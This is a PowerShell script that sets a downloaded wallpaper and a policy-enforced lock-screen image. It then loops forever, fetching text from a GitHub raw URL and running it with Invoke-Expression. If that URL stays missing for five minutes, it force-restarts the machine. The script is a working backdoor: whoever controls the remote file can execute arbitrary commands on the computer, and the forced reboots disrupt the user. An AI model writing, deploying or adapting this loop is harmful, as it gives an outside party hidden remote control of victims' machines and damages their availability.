$imageUrl = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/sae.png"
$imageUrl2 = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/ptm.png"
$imagePath = "$env:TEMP\wallpaper.png"
$imagePath2 = "$env:TEMP\lockscreen.png"

$url = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/stp"

$checkInterval = 10
$failThreshold = 300
$failTime = 0

try {
    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath -UseBasicParsing
    Invoke-WebRequest -Uri $imageUrl2 -OutFile $imagePath2 -UseBasicParsing
    Add-Type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;

public class WallpaperChanger
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    
    public static void SetWallpaper(string path)
    {
        try
        {
            Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "Wallpaper", path);
            Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WallpaperStyle", "2");
            Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "TileWallpaper", "0");
        }
        catch {}
        
        SystemParametersInfo(20, 0, path, 3);
    }
}
"@

    [WallpaperChanger]::SetWallpaper($imagePath)
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Force | Out-Null

    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" `
        -Name "LockScreenImage" `
        -Value $imagePath2 `
        -PropertyType String `
        -Force | Out-Null

}
catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

while ($true) {
    try {
        $response = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
        if ($response.StatusCode -eq 200) {
            $failTime = 0
            Invoke-Expression $response.Content
        }
    }
    catch {
        if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 404) {
            $failTime += $checkInterval
            if ($failTime -ge $failThreshold) {
                try {
                    Restart-Computer -Force -ErrorAction Stop
                }
                catch {
                    shutdown.exe /r /t 10 /f
                }
            }
        }
        else {
            Write-Output "Request failed: $_"
        }
    }

    Start-Sleep -Seconds $checkInterval
}


